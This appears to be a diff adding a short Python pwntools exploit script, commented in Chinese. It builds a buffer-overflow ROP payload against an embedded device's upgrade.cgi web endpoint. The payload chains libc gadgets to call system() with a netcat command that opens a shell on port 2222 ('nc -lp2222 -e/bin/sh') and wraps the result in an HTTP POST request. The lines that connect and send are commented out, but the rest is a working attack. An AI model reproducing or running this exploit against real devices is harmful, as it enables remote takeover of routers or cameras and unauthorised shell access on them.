@@ -1,0 +1,19 @@
+# -*- coding: UTF-8 -*-
+#!/usr/bin/python
+
+from pwn import *
+import os
+# p = remote('192.168.14.75',80)
+libc_base = 0xb6f2b000    # libC 库在内存中的加载地址 
+stack_base = 0xbeffea60 # 崩溃时 SP 寄存器的地址
+libc_elf = ELF('libuClibc-0.9.33.3-git.so')
+
+payload = (0x38 - 4) * 'a' # padding
+payload +=  p32(0x00048784 + libc_base) # gadget1
+payload += p32(0x80 + stack_base) # 栈中命令参数地址
+payload += p32(0x00016aa4 + libc_base) # gadget2
+payload += (0x8 * 'a')  # padding
+payload += p32(libc_elf.symbols['system'] + libc_base) # 内存中 system() 函数地址
+payload += ('pwn;' * 0x80 +'nc\x20-lp2222\x20-e/bin/sh\x20>') # 命令参数
+payload = "POST /cgi-bin/admin/upgrade.cgi \nHTTP/1.0\nContent-Length:{}\n\r\n\r\n".format(payload)
+#p.send(payload)
